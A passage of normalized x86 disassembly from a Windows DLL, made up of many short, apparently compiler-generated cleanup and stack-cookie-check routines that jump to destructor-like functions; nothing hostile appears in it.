jmp sub_10035d10
sub_1007ea95
lea ecx [ ebp - 0x80 ]
jmp sub_10035d10
sub_1007ea9d
lea ecx [ ebp - 0x80 ]
jmp sub_10035d10
sub_1007eaa5
lea ecx [ ebp - 0x64 ]
jmp sub_10035d10
sub_1007eaad
lea ecx [ ebp - 0x80 ]
jmp sub_10035d10
sub_1007eab5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xf0 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007eadd
push [ ebp - 0x10 ]
call sub_10065045
pop ecx
retn
sub_1007eae7
mov ecx [ ebp - 0x10 ]
jmp sub_10055970
sub_1007eaef
push [ ebp - 0x18 ]
call sub_10065045
pop ecx
retn
sub_1007eaf9
mov ecx [ ebp - 0x18 ]
jmp sub_1001e1b5
sub_1007eb01
push [ ebp - 0x18 ]
call sub_10065045
pop ecx
retn
sub_1007eb0b
mov ecx [ ebp - 0x18 ]
jmp sub_1001e1b5
sub_1007eb13
push [ ebp + 0xc ]
call sub_10065045
pop ecx
retn
sub_1007eb1d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007eb38
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10035d10
sub_1007eb51
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007eb6c
lea ecx [ ebp - 0x2c ]
jmp sub_10035d10
sub_1007eb74
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1007eb7c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007eba1
lea ecx [ ebp - 0x2c ]
jmp sub_10035d10
sub_1007eba9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ebce
lea ecx [ ebp - 0x54 ]
jmp sub_10035d10
sub_1007ebd6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ebfb
lea ecx [ ebp - 0x2c ]
jmp sub_10035d10
sub_1007ec03
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ec28
lea ecx [ ebp - 0x60 ]
jmp sub_1002a730
sub_1007ec30
lea ecx [ ebp - 0x2c ]
jmp sub_10028b21
sub_1007ec38
lea ecx [ ebp - 0x48 ]
jmp sub_10028b21
sub_1007ec40
lea ecx [ ebp - 0x48 ]
jmp sub_10028b21
sub_1007ec48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ec6d
lea ecx [ ebp + 0x24 ]
jmp sub_10028b21
sub_1007ec75
lea ecx [ ebp - 0xa8 ]
jmp sub_1002a730
sub_1007ec80
lea ecx [ ebp - 0xac ]
jmp sub_1002a730
sub_1007ec8b
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1007ec93
lea ecx [ ebp - 0x2c ]
jmp sub_10028b21
sub_1007ec9b
lea ecx [ ebp - 0x80 ]
jmp sub_10028b21
sub_1007eca3
lea ecx [ ebp - 0x80 ]
jmp sub_10028b21
sub_1007ecab
lea ecx [ ebp - 0x64 ]
jmp sub_10028b21
sub_1007ecb3
lea ecx [ ebp - 0x80 ]
jmp sub_10028b21
sub_1007ecbb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xf0 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ece3
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10028b21
sub_1007ecfc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ed17
lea ecx [ ebp - 0x54 ]
jmp sub_10028b21
sub_1007ed1f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ed44
lea ecx [ ebp - 0x2c ]
jmp sub_10028b21
sub_1007ed4c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ed71
lea ecx [ ebp - 0x194 ]
jmp sub_1002a730
sub_1007ed7c
lea ecx [ ebp - 0x19c ]
jmp sub_1002a730
sub_1007ed87
lea ecx [ ebp - 0x48 ]
jmp sub_10028b21
sub_1007ed8f
lea ecx [ ebp - 0x64 ]
jmp sub_10028b21
sub_1007ed97
lea ecx [ ebp - 0x1a0 ]
jmp sub_1002a730
sub_1007eda2
lea ecx [ ebp - 0x80 ]
jmp sub_10021250
sub_1007edaa
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007edb2
mov eax [ ebp - 0x168 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x168 ] 0xfffffffe
lea ecx [ ebp - 0x128 ]
jmp sub_10028b21
sub_1007edd4
mov eax [ ebp - 0x168 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x168 ] 0xfffffffd
lea ecx [ ebp - 0xf0 ]
jmp sub_10028b21
sub_1007edf6
lea ecx [ ebp - 0x160 ]
jmp sub_10028b21
sub_1007ee01
mov eax [ ebp - 0x168 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x168 ] 0xfffffffb
lea ecx [ ebp - 0xd4 ]
jmp sub_10028b21
sub_1007ee23
mov eax [ ebp - 0x168 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x168 ] 0xfffffff7
lea ecx [ ebp - 0x144 ]
jmp sub_10028b21
sub_1007ee45
lea ecx [ ebp - 0xb8 ]
jmp sub_10028b21
sub_1007ee50
lea ecx [ ebp - 0x2c ]
jmp sub_10028b21
sub_1007ee58
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1a4 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ee80
lea ecx [ ebp - 0x2c ]
jmp sub_10028b21
sub_1007ee88
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1007ee90
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007eeb5
lea ecx [ ebp - 0x2c ]
jmp sub_10028b21
sub_1007eebd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007eee2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007eefd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ef18
push [ ebp + 0x8 ]
call sub_10065045
pop ecx
retn
sub_1007ef22
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x34 ]
jmp sub_10062210
sub_1007ef3b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ef56
lea ecx [ ebp - 0x34 ]
jmp sub_10021250
sub_1007ef5e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007ef83
push [ ebp - 0x14 ]
call sub_10065045
pop ecx
retn
sub_1007ef8d
mov ecx [ ebp - 0x14 ]
jmp sub_1001e1b5
sub_1007ef95
push [ ebp - 0x14 ]
call sub_10065045
pop ecx
retn
sub_1007ef9f
mov ecx [ ebp - 0x14 ]
jmp sub_1001e1b5
sub_1007efa7
push [ ebp + 0xc ]
call sub_10065045
pop ecx
retn
sub_1007efb1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007efcc
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10021250
sub_1007efe5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f000
lea ecx [ ebp - 0x19c ]
jmp sub_1002a730
sub_1007f00b
lea ecx [ ebp - 0x198 ]
jmp sub_1002a730
sub_1007f016
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1007f01e
lea ecx [ ebp - 0x64 ]
jmp sub_10021250
sub_1007f026
lea ecx [ ebp - 0x190 ]
jmp sub_1002a730
sub_1007f031
lea ecx [ ebp - 0x80 ]
jmp sub_10021250
sub_1007f039
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007f041
mov eax [ ebp - 0x168 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x168 ] 0xfffffffe
lea ecx [ ebp - 0x9c ]
jmp sub_10021250
sub_1007f063
mov eax [ ebp - 0x168 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x168 ] 0xfffffffd
lea ecx [ ebp - 0x144 ]
jmp sub_10021250
sub_1007f085
lea ecx [ ebp - 0xb8 ]
jmp sub_10021250
sub_1007f090
mov eax [ ebp - 0x168 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x168 ] 0xfffffffb
lea ecx [ ebp - 0x128 ]
jmp sub_10021250
sub_1007f0b2
mov eax [ ebp - 0x168 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x168 ] 0xfffffff7
lea ecx [ ebp - 0xf0 ]
jmp sub_10021250
sub_1007f0d4
lea ecx [ ebp - 0x160 ]
jmp sub_10021250
sub_1007f0df
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007f0e7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1a8 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f10f
lea ecx [ ebp + 0x24 ]
jmp sub_10021250
sub_1007f117
lea ecx [ ebp - 0xac ]
jmp sub_1002a730
sub_1007f122
lea ecx [ ebp - 0xb4 ]
jmp sub_1002a730
sub_1007f12d
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1007f135
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007f13d
lea ecx [ ebp - 0x80 ]
jmp sub_10021250
sub_1007f145
lea ecx [ ebp - 0x80 ]
jmp sub_10021250
sub_1007f14d
lea ecx [ ebp - 0x64 ]
jmp sub_10021250
sub_1007f155
lea ecx [ ebp - 0x80 ]
jmp sub_10021250
sub_1007f15d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xf8 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f185
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007f18d
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_1007f195
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f1ba
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007f1c2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f1e7
lea ecx [ ebp - 0x54 ]
jmp sub_10021250
sub_1007f1ef
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f214
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_1007f21c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f250
mov eax [ ebp - 0x10 ]
push eax
call sub_10065045
pop ecx
retn
sub_1007f25b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f280
mov ecx [ ebp - 0x10 ]
jmp sub_1002470e
sub_1007f288
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_100476f0
sub_1007f293
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_100476f0
sub_1007f29e
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_100476f0
sub_1007f2a9
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_100476f0
sub_1007f2b4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f2d0
lea ecx [ ebp - 0x4c ]
jmp sub_10055f90
sub_1007f2d8
lea ecx [ ebp - 0xa4 ]
jmp sub_10055f90
sub_1007f2e3
lea ecx [ ebp - 0x94 ]
jmp sub_10055f90
sub_1007f2ee
lea ecx [ ebp - 0x84 ]
jmp sub_10055f90
sub_1007f2f9
lea edi [ ebp - 0x74 ]
jmp sub_10005b80
sub_1007f301
lea ecx [ ebp - 0x4c ]
jmp sub_10055f90
sub_1007f309
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xb8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f330
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f350
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f370
lea esi [ ebp - 0xac ]
jmp j_sub_100173d0
sub_1007f37b
lea esi [ ebp - 0xb4 ]
jmp j_sub_100173d0
sub_1007f386
lea esi [ ebp - 0xbc ]
jmp j_sub_100173d0
sub_1007f391
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc4 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f3c0
lea esi [ ebp - 0x128 ]
jmp j_sub_100173d0
sub_1007f3cb
lea esi [ ebp - 0x138 ]
jmp j_sub_100173d0
sub_1007f3d6
lea esi [ ebp - 0x130 ]
jmp j_sub_100173d0
sub_1007f3e1
lea esi [ ebp - 0x140 ]
jmp j_sub_100173d0
sub_1007f3ec
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f420
lea esi [ ebp - 0x14 ]
jmp j_sub_100173d0
sub_1007f428
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f450
mov ecx [ ebp - 0x10 ]
jmp sub_1002470e
sub_1007f458
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_100476f0
sub_1007f463
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_100476f0
sub_1007f46e
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_100476f0
sub_1007f479
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_100476f0
sub_1007f484
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f4a0
lea eax [ ebp - 0x60 ]
jmp sub_1002d0f0
sub_1007f4a8
lea eax [ ebp - 0x50 ]
jmp sub_1002d0f0
sub_1007f4b0
lea eax [ ebp - 0x54 ]
jmp sub_1002d0f0
sub_1007f4b8
lea eax [ ebp - 0x4c ]
jmp sub_1002d0f0
sub_1007f4c0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x64 ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_1004c3b6
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f4f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f510
mov eax [ ebp - 0x30 ]
jmp sub_1005fd00
sub_1007f518
lea eax [ ebp - 0x34 ]
jmp sub_100260d0
sub_1007f520
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f550
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10061091
sub_1007f55b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f580
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f5a0
mov edi [ ebp + 0x8 ]
add edi 0x18
jmp sub_10065690
sub_1007f5ab
mov edi [ ebp + 0x8 ]
add edi 0x20
jmp sub_10014890
sub_1007f5b6
mov esi [ ebp + 0x8 ]
add esi 0x28
jmp sub_10010040
sub_1007f5c1
mov esi [ ebp + 0x8 ]
add esi 0x30
jmp sub_10010040
sub_1007f5cc
mov esi [ ebp + 0x8 ]
add esi 0x38
jmp sub_10010040
sub_1007f5d7
lea edi [ ebp - 0x18 ]
jmp sub_10065690
sub_1007f5df
lea esi [ ebp - 0x18 ]
jmp sub_10010040
sub_1007f5e7
lea esi [ ebp - 0x18 ]
jmp sub_10010040
sub_1007f5ef
lea esi [ ebp - 0x18 ]
jmp sub_10010040
sub_1007f5f7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f620
mov edi [ ebp + 0x8 ]
add edi 0x18
jmp sub_10065690
sub_1007f62b
mov edi [ ebp + 0x8 ]
add edi 0x20
jmp sub_10014890
sub_1007f636
mov esi [ ebp + 0x8 ]
add esi 0x28
jmp sub_10010040
sub_1007f641
mov esi [ ebp + 0x8 ]
add esi 0x30
jmp sub_10010040
sub_1007f64c
mov esi [ ebp + 0x8 ]
add esi 0x38
jmp sub_10010040
sub_1007f657
lea esi [ ebp - 0x18 ]
jmp sub_10010040
sub_1007f65f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f680
mov edi [ ebp + 0x8 ]
add edi 0x18
jmp sub_10065690
sub_1007f68b
mov edi [ ebp + 0x8 ]
add edi 0x20
jmp sub_10014890
sub_1007f696
mov esi [ ebp + 0x8 ]
add esi 0x28
jmp sub_10010040
sub_1007f6a1
mov esi [ ebp + 0x8 ]
add esi 0x30
jmp sub_10010040
sub_1007f6ac
mov esi [ ebp + 0x8 ]
add esi 0x38
jmp sub_10010040
sub_1007f6b7
lea edi [ ebp - 0x18 ]
jmp sub_10065690
sub_1007f6bf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f6e0
mov edi [ ebp - 0x78 ]
add edi 0x18
jmp sub_10065690
sub_1007f6eb
mov edi [ ebp - 0x78 ]
add edi 0x20
jmp sub_10014890
sub_1007f6f6
mov esi [ ebp - 0x78 ]
add esi 0x28
jmp sub_10010040
sub_1007f701
mov esi [ ebp - 0x78 ]
add esi 0x30
jmp sub_10010040
sub_1007f70c
mov esi [ ebp - 0x78 ]
add esi 0x38
jmp sub_10010040
sub_1007f717
lea edi [ ebp - 0x4c ]
jmp sub_10065690
sub_1007f71f
lea edi [ ebp - 0x5c ]
jmp sub_10014890
sub_1007f727
lea esi [ ebp - 0x64 ]
jmp sub_10010040
sub_1007f72f
lea esi [ ebp - 0x6c ]
jmp sub_10010040
sub_1007f737
lea esi [ ebp - 0x74 ]
jmp sub_10010040
sub_1007f73f
lea edi [ ebp - 0x54 ]
jmp sub_10065690
sub_1007f747
lea esi [ ebp - 0x9c ]
jmp sub_10010040
sub_1007f752
lea esi [ ebp - 0x94 ]
jmp sub_10010040
sub_1007f75d
lea esi [ ebp - 0x8c ]
jmp sub_10010040
sub_1007f768
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f790
lea esi [ ebp - 0x68 ]
jmp sub_10010040
sub_1007f798
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f7c0
mov eax [ ebp + 0x8 ]
jmp sub_1003b4e0
sub_1007f7c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f7f0
mov eax [ ebp - 0x10 ]
jmp sub_1005fd00
sub_1007f7f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f820
mov eax [ ebp - 0x10 ]
jmp sub_1005fd00
sub_1007f828
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f850
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_1000a4d0
sub_1007f85b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f880
mov eax [ ebp - 0x10 ]
push eax
call sub_10065045
pop ecx
retn
sub_1007f88b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f8b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f8d0
mov ecx [ ebp + 0x8 ]
jmp sub_10035d10
sub_1007f8d8
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
jmp sub_10035d10
sub_1007f8e3
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_10035d10
sub_1007f8ee
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f910
lea edi [ ebp - 0x58 ]
jmp sub_10065690
sub_1007f918
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f940
lea edi [ ebp - 0x180 ]
jmp sub_10065690
sub_1007f94b
lea edi [ ebp - 0x178 ]
jmp sub_10014890
sub_1007f956
lea esi [ ebp - 0x160 ]
jmp sub_10010040
sub_1007f961
lea esi [ ebp - 0x170 ]
jmp sub_10010040
sub_1007f96c
lea esi [ ebp - 0x168 ]
jmp sub_10010040
sub_1007f977
mov eax [ ebp - 0x154 ]
jmp sub_1005fd00
sub_1007f982
mov eax [ ebp - 0x154 ]
jmp sub_1005fd00
sub_1007f98d
mov eax [ ebp - 0x154 ]
jmp sub_1005fd00
sub_1007f998
mov eax [ ebp - 0x154 ]
jmp sub_1005fd00
sub_1007f9a3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x190 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007f9d0
mov ecx [ ebp + 0x8 ]
jmp sub_10035d10
sub_1007f9d8
mov ecx [ ebp + 0x8 ]
add ecx 0x24
jmp sub_10035d10
sub_1007f9e3
mov ecx [ ebp + 0x8 ]
add ecx 0x40
jmp sub_10035d10
sub_1007f9ee
mov ecx [ ebp + 0x8 ]
add ecx 0x5c
jmp sub_10035d10
sub_1007f9f9
mov ecx [ ebp + 0x8 ]
add ecx 0x78
jmp sub_10035d10
sub_1007fa04
mov ecx [ ebp + 0x8 ]
add ecx 0x94
jmp sub_10035d10
sub_1007fa12
mov ecx [ ebp + 0x8 ]
add ecx 0xb0
jmp sub_10035d10
sub_1007fa20
mov ecx [ ebp + 0x8 ]
add ecx 0xcc
jmp sub_10035d10
sub_1007fa2e
mov ecx [ ebp + 0x8 ]
add ecx 0xe8
jmp sub_10035d10
sub_1007fa3c
mov ecx [ ebp + 0x8 ]
add ecx 0x104
jmp sub_10035d10
sub_1007fa4a
mov esi [ ebp + 0x8 ]
add esi 0x120
jmp sub_1002e480
sub_1007fa58
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fa80
mov ecx [ ebp + 0x8 ]
jmp sub_1005d8e0
sub_1007fa88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_1007fab0
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10035d10
sub_1007fabb
mov ecx [ ebp + 0x8 ]
add ecx 0x24
jmp sub_10035d10
sub_1007fac6
mov ecx [ ebp + 0x8 ]
add ecx 0x40
